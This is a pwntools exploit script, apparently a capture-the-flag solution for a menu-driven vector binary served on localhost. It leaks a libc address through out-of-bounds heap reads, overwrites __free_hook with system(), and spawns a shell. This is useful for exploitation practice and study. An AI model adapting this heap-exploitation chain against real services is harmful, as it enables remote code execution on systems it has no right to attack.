from pwn import *
from struct import pack, unpack


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def push_back(value):
    value = unpack("<i", pack("<I", value))[0]
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'value: ', b'%d' % value)
    io.recvuntil(b'1.')


@debug
def pop_back():
    io.sendlineafter(b'>> ', b'2')
    io.recvuntil(b'1.')


@debug
def store(index, value):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.sendlineafter(b'value: ', b'%d' % value)
    io.recvuntil(b'1.')


@debug
def load(index):
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b'index: ', b'%d' % index)
    io.recvuntil(b'value: ')
    data = io.recvline().rstrip()
    io.recvuntil(b'1.')
    return data


@debug
def wipe():
    io.sendlineafter(b'>> ', b'5')
    io.recvuntil(b'1.')

binpath = './main'
# binpath = './chall'

elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'

gdbscript = '''
gef
# b 40
# b 15
set $target=0x000055555556e730
b 56
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('localhost', 8888)

# for i in range(257):
for i in range(513):
    push_back(i)
wipe()

push_back(1)
pop_back()

for i in range(547):
    pop_back()

# store(14, 0x21)

data = load(544)
addr_main_arena = int(data)
print(addr_main_arena)
data = load(545)
addr_main_arena = addr_main_arena + (int(data) << 32)
addr_libc = addr_main_arena - 0x1ebbe0
print('addr_main_arena = 0x{:08x}'.format(addr_main_arena))
print('addr_libc = 0x{:08x}'.format(addr_libc))

wipe()

# for i in range(1 + 2 + 4 + 8 + 1):
#     push_back(i)
# io.interactive()
# wipe()

for i in range(1 + 2 + 2):
    push_back(i)

for i in range(0x15):
    pop_back()

addr_free_hook = addr_libc + libc.symbols['__free_hook']
print('addr_free_hook = 0x{:08x}'.format(addr_free_hook))
push_back(addr_free_hook & 0xffffffff)
push_back(addr_free_hook >> 32)

wipe()

addr_system = addr_libc + libc.symbols['system']
print('addr_system = 0x{:08x}'.format(addr_system))
push_back(addr_system & 0xffffffff)
push_back(addr_system >> 32)

wipe()
push_back(u32(b'sh\x00\x00'))
io.sendlineafter(b'>> ', b'1')
io.sendlineafter(b'value: ', b'10')

io.interactive()
